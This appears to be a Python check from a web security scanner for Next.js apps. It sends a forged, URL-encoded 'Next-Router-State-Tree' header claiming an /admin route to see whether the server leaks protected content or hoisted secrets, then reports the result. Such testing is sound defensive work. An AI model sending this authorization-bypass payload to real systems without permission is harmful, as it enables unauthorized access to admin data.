from typing import Any, Dict
from ..http_client import HttpClient
from ..scenarios import SimpleScenario

def run_hydration_collapse(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    RSC Partial Hydration Trust Collapse.
    
    Mechanism: 
    - Verifies if the server trusts the client to dictate which components to hydrate/render.
    - Manipulates 'Next-Router-State-Tree' to bypass client-side guards.
    """
    
    issues = []
    evidence = []
    
    target = scenario.target
    
    # Payload: A fabricated Router State Tree that claims we are currently on a "Protected" page
    # forcing the server to send the RSC payload for it, assuming we are allowed there.
    # We try to bypass "Client-Only Guards" by asking the Server directly.
    
    # Encoded: ["",{"children":["__PAGE__",{}]}] -> forcing a reset
    # We try to inject a path we shouldn't be on: /admin
    
    headers = {
        "RSC": "1",
        "Next-Router-State-Tree": '%5B%22%22%2C%7B%22children%22%3A%5B%22admin%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%5D'
    }
    
    resp = client.send("GET", target, headers=headers)
    
    # Analysis
    if resp.status_code == 200:
        if "Admin" in resp.text or "Dashboard" in resp.text:
             issues.append("Partial Hydration Collapse: Accessed '/admin' content via Router State manipulation.")
             evidence.append(f"Leaked Admin Logic: {resp.text[:200]}")
        
        if "Suspense" not in resp.text and "loading" not in resp.text:
             # If we got FULL content instantly, we might have bypassed a Suspense boundary intended to guard data.
             pass

    # Compiler/Build Artifact Check (part of "Compiler-Introduced Vulnerabilities")
    # Check for leaked secrets in the JS bundles (looking for common hoisting artifacts)
    if "process.env" in resp.text or "NEXT_PUBLIC_" in resp.text:
         # Normal for NEXT_PUBLIC, but if we see non-public keys hoisted:
         if "SECRET" in resp.text or "KEY" in resp.text:
              issues.append("Compiler Hoisting Leak: Potential server-side secrets included in client bundle.")
              evidence.append(f"Leaked Secret Artifact: {resp.text[:100]}")

    # Forensic Narrative
    narrative = []
    if issues:
        narrative.append("Forensic Analysis: Partial Hydration Integrity Failed.")
        narrative.append("Observation: Server accepted client-dictated component state tree explicitly triggering protected routes.")
        narrative.append("Impact: Client-Side Guard Bypass (Authorization Failure).")
    
    return {
        "scenario_id": scenario.id,
        "attack_type": "rsc_hydration_collapse",
        "passed": len(issues) == 0,
        "details": {
             "title": "Partial Hydration Trust Collapse",
             "issues": issues,
             "forensic_narrative": narrative,
             "evidence": evidence
        }
    }
